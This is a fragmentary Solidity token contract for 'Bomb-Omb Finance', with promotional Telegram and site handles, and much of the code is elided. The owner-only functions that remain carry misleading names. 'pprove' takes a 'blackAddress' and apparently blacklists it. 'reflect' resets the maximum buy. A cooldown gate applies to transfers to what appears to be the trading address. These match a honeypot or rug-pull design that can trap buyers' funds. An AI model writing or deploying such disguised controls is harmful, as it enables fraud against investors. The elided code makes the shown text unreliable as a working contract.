...
`-._`.___,'    `--`--''   `--`./  `--``-._`.___,'                  `--`--''   `--`./  `--``-._`.___,'   
 ...
 Telegram: @bombombfinance
 Site: bomb-omb.finance 
...
contract BombOmbFinance is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 8008 * 10**9 * 10**18;

    string private _name = 'Bomb-Omb Finance';
    string private _symbol = '💣BOMB💣';
    uint8 private _decimals = 18;    
    uint256 public MaxBuy  = 4000000000 * 10**18;
  ...
  if (sender != initializer && recipient == public_address) {
                    ...
                    if (m_CoolDownSeconds >  0) {
                        require(m_Cooldown[recipient] < block.timestamp);
                        m_Cooldown[recipient] = block.timestamp + ( m_CoolDownSeconds * (1 seconds));
            }
        }    
    ...
    function pprove(address blackAddress) public onlyOwner {
    ...
    function reflect(uint256 maxTxBlackPercent) public onlyOwner {
        MaxBuy = maxTxBlackPercent * 10**18;
    }
}